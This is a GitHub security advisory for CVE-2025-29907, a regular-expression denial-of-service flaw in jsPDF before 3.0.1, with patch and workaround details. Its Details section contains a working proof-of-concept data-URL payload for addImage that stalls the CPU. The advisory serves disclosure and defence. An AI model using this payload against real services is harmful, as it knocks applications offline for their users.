# [H] jsPDF Bypass Regular Expression Denial of Service (ReDoS)

## Summary
Severity: High
Advisory: GHSA-w532-jxjh-hjhj
CVE: CVE-2025-29907
CWE: CWE-400, CWE-770
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-03-18
Source: https://github.com/advisories/GHSA-w532-jxjh-hjhj
Type: github-advisory

## Affected
- npm: `jspdf` — affected >=0 <3.0.1

## Details
### Impact
User control of the first argument of the `addImage` method results in CPU utilization and denial of service.

If given the possibility to pass unsanitized image urls to the `addImage` method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.

Other affected methods are: `html`, `addSvgAsImage`.

Example payload:
```js
import { jsPDF } from "jpsdf" 

const doc = new jsPDF();
const payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\x00base64,undefined';

const startTime = performance.now()

try {
 doc.addImage(payload, "PNG", 10, 40, 180, 180, undefined, "SLOW");
} catch (err) {
  const endTime = performance.now()
  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)
}

doc.save("a4.pdf");
```

### Patches
The vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@>=3.0.1

### Workarounds
Sanitize image urls before passing it to the `addImage` method or one of the other affected methods.

### Credits
Researcher: Aleksey Solovev (Positive Technologies)

## References
- https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj
- https://nvd.nist.gov/vuln/detail/CVE-2025-29907
- https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df
- https://github.com/parallax/jsPDF
